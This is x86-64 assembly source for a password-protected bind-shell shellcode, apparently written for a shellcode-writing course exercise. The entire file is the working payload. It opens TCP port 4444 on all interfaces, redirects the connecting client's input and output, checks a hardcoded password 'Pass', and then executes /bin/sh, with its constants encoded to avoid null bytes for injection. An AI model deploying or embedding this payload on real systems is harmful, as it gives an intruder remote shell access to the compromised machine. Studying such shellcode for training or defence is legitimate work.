;Bind_TCP 4444  with password			     ;
;Default password = Pass                        ;
;If connected the shellcode no prompt for password   ;
;Enter password directly and you get the bin/sh shell;
;if password is wrong the shellcode exit:            ;
;Christophe G SLAE64 - 1337			     ;



global _start



_start:


	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41

        xor rdx , rdx
	push 0x29
	pop rax
        push 0x2
	pop rdi
	push 0x1
	pop rsi
	syscall

	; copy socket descriptor to rdi for future use
	xchg rax , rdi


	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	 xor rax, rax
	 push rax

         mov rbx , 0xffffffffa3eefffd    ;mov dword [rsp - 4] , eax  address 0.0.0.0  ;push word 0x5c11 ; port 4444 ;push word 0x2 in one instruction "noted" to remove nulls
         not rbx
         push rbx
         push rsp

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	push 0x31
	pop rax
        pop rsi
	push 0x10
	pop rdx
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	push 0x32
	pop rax
	push 0x2
	pop rsi
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43


	push 0x2b
	pop rax
	sub rsp, 0x10
	push rsp
        pop rsi
        push 0x10
        push rsp
        pop rdx

        syscall

	; store the client socket description
	mov r9, rax

        ; close parent

        push 0x3
	pop rax
        syscall





	xchg rdi , r9
        xor rsi , rsi

     dup2:
  	push 0x21
        pop rax
        syscall
	inc rsi
	cmp rsi , 0x3
     loopne dup2

CheckPass:
	xor rax , rax
        push 0x8
        pop rdx
        sub rsp , 8  ; 8 bytes to receive user input
        push rsp
        pop rsi
        xor edi , edi
        syscall  ;system read function call

        push  0x73736150
        pop rax  ; "Pass"
        lea rdi , [rel rsi]
        scasd
        jz Execve
        push 0x3c
        pop rax
        syscall





   Execve:
	xor rsi , rsi
        mul rsi
      	push ax   ; terminate string with null
        mov rbx , 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        push byte 0x3b
        pop rax

	syscall





